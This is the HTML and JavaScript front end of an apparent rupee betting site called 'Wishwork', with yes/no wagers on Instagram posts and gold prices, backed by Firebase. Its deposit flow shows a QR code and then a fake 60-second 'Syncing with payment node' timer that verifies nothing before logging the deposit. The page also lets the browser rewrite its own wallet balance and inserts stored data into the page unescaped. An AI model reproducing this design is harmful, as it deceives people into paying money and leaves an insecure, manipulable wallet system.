<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wishwork | Official</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root {
            /* The specific Pink/Purple Gradient from your photo */
            --bg-gradient: linear-gradient(160deg, #0f172a 0%, #1e1b4b 25%, #701a75 60%, #4c0519 100%);
            --glass: rgba(255, 255, 255, 0.07);
            --glass-border: rgba(255, 255, 255, 0.1);
            --accent-pink: #f472b6;
            --tele-blue: #0088cc;
            --success: #22c55e;
            --danger: #ef4444;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            margin: 0; 
            font-family: 'Outfit', sans-serif; 
            background: var(--bg-gradient);
            background-attachment: fixed;
            color: #ffffff; 
            min-height: 100vh;
            padding-bottom: 100px;
        }

        /* HEADER */
        .header {
            padding: 18px 20px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            background: rgba(0, 0, 0, 0.25); 
            backdrop-filter: blur(20px);
            position: sticky; top: 0; z-index: 2000;
            border-bottom: 1px solid var(--glass-border);
        }

        .brand-logo {
            font-size: 20px; font-weight: 800; letter-spacing: 1.5px;
            color: #fff; text-shadow: 0 0 10px rgba(255,255,255,0.3);
        }

        /* BALANCE SECTION */
        .balance-card {
            background: var(--glass);
            backdrop-filter: blur(25px);
            border-radius: 24px; padding: 25px; margin: 20px; 
            border: 1px solid var(--glass-border);
            display: flex; justify-content: space-between; align-items: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        .balance-amount {
            font-size: 32px; font-weight: 800; color: #4ade80;
        }

        .top-up-btn {
            background: #8b5cf6; color: #fff; border: none;
            padding: 12px 24px; border-radius: 14px; font-weight: 700;
            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.4);
        }

        /* CATEGORIES */
        .categories {
            display: flex; gap: 10px; overflow-x: auto; 
            padding: 0 20px 20px; scrollbar-width: none;
        }
        .cat-btn {
            padding: 10px 20px; border-radius: 50px; 
            background: rgba(255,255,255,0.05); border: 1px solid var(--glass-border);
            color: rgba(255,255,255,0.6); font-size: 13px; white-space: nowrap;
        }
        .cat-btn.active { background: #fff; color: #000; font-weight: 700; }

        /* BET CARDS */
        .bet-card {
            background: var(--glass);
            backdrop-filter: blur(15px);
            padding: 24px; border-radius: 28px; margin: 0 20px 20px;
            border: 1px solid var(--glass-border);
        }

        .question { margin: 0 0 20px 0; font-size: 17px; font-weight: 600; line-height: 1.5; color: #f8fafc; }

        /* YES/NO BUTTONS (Official Style) */
        .options { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .opt-btn {
            padding: 15px; border-radius: 16px; border: none; 
            font-weight: 800; font-size: 14px; cursor: pointer;
            transition: 0.2s;
        }
        .yes-btn { background: #22c55e; color: #fff; }
        .no-btn { background: #ef4444; color: #fff; }

        /* TELEGRAM FLOATING BUTTON */
        .tele-fab {
            position: fixed;
            bottom: 30px;
            right: 25px;
            width: 65px;
            height: 65px;
            background: var(--tele-blue);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 25px rgba(0, 136, 204, 0.5);
            z-index: 4000;
            text-decoration: none;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 136, 204, 0.7); }
            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(0, 136, 204, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 136, 204, 0); }
        }

        .tele-fab i { color: white; font-size: 30px; }

        /* POPUP */
        .popup {
            position: fixed; bottom: -110%; left: 0; width: 100%;
            background: #0f172a; padding: 40px 30px; border-radius: 40px 40px 0 0;
            transition: 0.5s; z-index: 5000;
            border-top: 1px solid var(--accent-pink);
        }
        .popup.active { bottom: 0; }
        .input-bet {
            width: 100%; background: rgba(255,255,255,0.05); border: 1px solid var(--glass-border);
            padding: 20px; border-radius: 15px; color: #fff; font-size: 26px; text-align: center; margin: 20px 0;
        }

        .history-item { 
            background: var(--glass); padding: 18px; border-radius: 20px; 
            margin: 0 20px 10px; border: 1px solid var(--glass-border);
            display: flex; justify-content: space-between; align-items: center;
        }
    </style>
</head>
<body>

<a href="https://t.me/YOUR_TELEGRAM_ID" class="tele-fab" target="_blank">
    <i class="fa-brands fa-telegram"></i>
</a>

<div class="header">
    <div class="brand-logo">WISHWORK</div>
    <div onclick="logoutUser()" style="color:var(--danger); font-weight:700; font-size:12px; cursor:pointer;">LOGOUT</div>
</div>

<div class="balance-card">
    <div>
        <div style="font-size:11px; color:rgba(255,255,255,0.5); font-weight:700; letter-spacing:1px;">VAULT BALANCE</div>
        <div class="balance-amount">₹<span id="displayBalance">0</span></div>
    </div>
    <button class="top-up-btn" onclick="openDeposit()">Deposit</button>
</div>

<div class="categories">
    <button class="cat-btn active" onclick="filterBets('all', this)">All Feeds</button>
    <button class="cat-btn" onclick="filterBets('instagram', this)">Instagram</button>
    <button class="cat-btn" onclick="filterBets('gold', this)">Gold Market</button>
    <button class="cat-btn" onclick="filterBets('oil', this)">Oil Trade</button>
</div>

<div id="betsContainer">
    <div class="bet-card instagram">
        <h3 class="question">Will Karan Aujla post more than 5 stories on Instagram?</h3>
        <div class="options">
            <button class="opt-btn yes-btn" onclick="showBetPopup('Insta: Karan Aujla')">YES</button>
            <button class="opt-btn no-btn" onclick="showBetPopup('Insta: Karan Aujla')">NO</button>
        </div>
    </div>

    <div class="bet-card gold">
        <h3 class="question">Will Gold price increase tomorrow?</h3>
        <div class="options">
            <button class="opt-btn yes-btn" onclick="showBetPopup('Gold Price')">YES</button>
            <button class="opt-btn no-btn" onclick="showBetPopup('Gold Price')">NO</button>
        </div>
    </div>
</div>

<div id="historyBody"></div>

<div class="popup" id="masterPopup">
    <div id="mainUI">
        <h2 id="modalTitle" style="text-align:center; font-weight:800;">Transaction</h2>
        <input type="number" id="userAmt" class="input-bet" placeholder="₹ 0.00">
        <button class="opt-btn" id="actionBtn" onclick="runCoreLogic()" style="width:100%; background:#fff; color:#000;">CONFIRM</button>
    </div>
    <div id="qrUI" style="display:none; text-align:center;">
        <div style="width:200px; background:#fff; padding:15px; border-radius:20px; margin:20px auto;"><img src="qr.png" style="width:100%;"></div>
        <button class="opt-btn" style="width:100%; background:var(--success); color:#fff;" onclick="beginValidation()">VERIFY PAYMENT</button>
    </div>
    <div id="timerBox" style="display:none; text-align:center;">
        <div style="font-size:60px; font-weight:800; color:#38bdf8;" id="countdown">60</div>
        <p>Syncing with payment node...</p>
    </div>
    <div onclick="killPopup()" style="text-align:center; margin-top:30px; color:rgba(255,255,255,0.4); cursor:pointer; font-weight:600;">ABORT</div>
</div>

<script type="module">
    // Firebase and App Logic (Preserved)
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, onSnapshot, updateDoc, collection, addDoc, serverTimestamp, query, where, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const fConfig = { apiKey: "AIzaSyDVku-LXDpxjm_8mwsUJr5nUtwhsA3MSf8", authDomain: "home-help-service.firebaseapp.com", projectId: "home-help-service", storageBucket: "home-help-service.firebasestorage.app", messagingSenderId: "160722457510", appId: "1:160722457510:web:f2c5fa0b922a0ccc58b567" };
    const app = initializeApp(fConfig); const db = getFirestore(app);
    const uEmail = localStorage.getItem("userEmail"); if (!uEmail) window.location.href="login.html";

    onSnapshot(doc(db, "wallets", uEmail), (s) => { if (s.exists()) document.getElementById("displayBalance").innerText = s.data().balance; });

    const qA = query(collection(db, "users"), where("email", "==", uEmail), orderBy("time", "desc"));
    onSnapshot(qA, (snap) => {
        let h = "<div style='font-size:12px; font-weight:700; color:rgba(255,255,255,0.3); text-align:center; margin:30px 0 15px;'>ACTIVITY LOG</div>"; 
        snap.forEach(d => { 
            const da = d.data(); 
            if(da.actionType) { 
                const st = da.status || "PENDING"; 
                h += `<div class="history-item"><div><b style="color:#fff;">${da.actionType}</b><br><small style="color:rgba(255,255,255,0.4)">${da.password}</small></div><div style="color:var(--success); font-weight:800;">${st}</div></div>`; 
            } 
        });
        document.getElementById("historyBody").innerHTML = h;
    });

    let depMode = false;
    window.logoutUser = () => { localStorage.clear(); window.location.href = "login.html"; };
    window.showBetPopup = (t) => { depMode=false; document.getElementById("masterPopup").classList.add("active"); document.getElementById("modalTitle").innerText = "Confirm Bet"; };
    window.openDeposit = () => { depMode=true; document.getElementById("masterPopup").classList.add("active"); document.getElementById("modalTitle").innerText = "Deposit"; };
    window.killPopup = () => { document.getElementById("masterPopup").classList.remove("active"); resetUI(); };

    window.runCoreLogic = async () => {
        let val = parseInt(document.getElementById("userAmt").value); 
        let bal = parseInt(document.getElementById("displayBalance").innerText);
        if(!val || val <= 0) return;
        if(depMode) { 
            document.getElementById("qrUI").style.display="block"; document.getElementById("actionBtn").style.display="none"; document.getElementById("userAmt").style.display="none"; 
        } else {
            if(val > bal) return alert("Insufficient Vault Funds");
            await updateDoc(doc(db, "wallets", uEmail), { balance: bal - val });
            await addDoc(collection(db, "users"), { email: uEmail, password: `₹${val}`, actionType: `Bet`, status: "PENDING", time: serverTimestamp() });
            killPopup();
        }
    };

    window.beginValidation = () => {
        document.getElementById("mainUI").style.display="none"; document.getElementById("qrUI").style.display="none"; document.getElementById("timerBox").style.display="block";
        let t = 60; let clock = setInterval(async () => {
            t--; document.getElementById("countdown").innerText = t;
            if(t <= 0) { clearInterval(clock); await addDoc(collection(db, "users"), { email: uEmail, password: `₹${document.getElementById("userAmt").value}`, actionType: "DEPOSIT", status: "PENDING", time: serverTimestamp() }); killPopup(); }
        }, 1000);
    };

    window.filterBets = (c, b) => {
        document.querySelectorAll('.cat-btn').forEach(i => i.classList.remove('active')); b.classList.add('active');
        document.querySelectorAll('.bet-card').forEach(card => { card.style.display = (c==='all' || card.classList.contains(c)) ? 'block' : 'none'; });
    };

    function resetUI() {
        document.getElementById("mainUI").style.display="block"; document.getElementById("timerBox").style.display="none"; document.getElementById("qrUI").style.display="none"; document.getElementById("actionBtn").style.display="block"; document.getElementById("userAmt").style.display="block"; document.getElementById("userAmt").value="";
    }
</script>
</body>
</html>
